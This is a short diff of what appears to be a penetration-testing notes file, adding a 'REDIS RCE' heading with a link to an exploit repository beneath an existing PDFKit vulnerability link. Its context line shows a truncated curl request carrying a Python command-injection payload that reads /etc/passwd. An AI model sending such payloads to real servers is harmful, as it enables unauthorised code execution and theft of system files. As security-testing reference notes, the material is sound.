@@ -130,3 +130,8 @@ curl -i -s -k -X $'POST' --data-binary $'jk=pyimport%20os;os.system(\"cat /etc/p
 ### PDFKIT VULNERABILTY ###
 
 https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795
+
+
+### REDIS RCE ###
+
+https://github.com/Ridter/redis-rce
